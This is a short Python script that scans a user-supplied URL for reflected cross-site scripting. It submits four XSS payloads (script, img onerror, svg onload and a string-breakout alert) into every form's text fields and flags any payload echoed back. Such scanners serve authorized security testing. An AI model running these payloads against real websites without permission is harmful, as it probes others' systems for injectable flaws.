from time import sleep
from typing import List
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup
from bs4.element import Tag

XSS_PAYLOADS = [
    "<script>alert(666)</script>",
    "\"'><img src=x onerror=alert(666)>",
    "<svg/onload=alert(666)>",
    "';alert(666);//",
]


def scan_xss(url, wait_time=3):
    print(f"[*] Scanning {url} for XSS...")

    forms = find_forms(url)
    print(f"[+] Found {len(forms)} forms.")

    found_xss = []
    for i, form in enumerate(forms, 1):
        details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            response = submit_form(details, url, payload)
            if payload in response.text:
                found_xss.append(f"XSS found in form #{i} with payload: {payload}")
            sleep(wait_time)
    print("XSS found: ", found_xss)
    return found_xss


def find_forms(url) -> List[Tag]:
    soup = BeautifulSoup(requests.get(url).text, "html.parser")
    return soup.find_all("form")


def get_form_details(form) -> dict:
    details = {
        "action": form.get("action"),
        "method": form.get("method", "get").lower(),
        "inputs": [],
        "textareas": [],
    }

    get_input_text_tags(details, form)
    get_textarea_tags(details, form)

    return details


def get_input_text_tags(details, form):
    for input_tag in form.find_all("input"):
        name = input_tag.get("name")
        input_type = input_tag.get("type", "text")
        if name:
            details["inputs"].append({"name": name, "type": input_type})


def get_textarea_tags(details, form):
    for input_tag in form.find_all("textarea"):
        name = input_tag.get("name")
        if name:
            details["textareas"].append({"name": name})


def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = prepare_input_text_tags_for_submit(form_details, payload)
    data.update(prepare_textarea_tags_for_submit(form_details, payload))
    print("Attempting to submit: ", data)

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)


def prepare_input_text_tags_for_submit(form_details, payload) -> dict:
    return {input["name"]: payload for input in form_details.get("inputs", []) if input["type"] == "text"}


def prepare_textarea_tags_for_submit(form_details, payload) -> dict:
    return {input["name"]: payload for input in form_details.get("textareas", [])}


if __name__ == "__main__":
    target = input("Enter target URL (e.g. http://localhost/test): ")
    scan_xss(target)
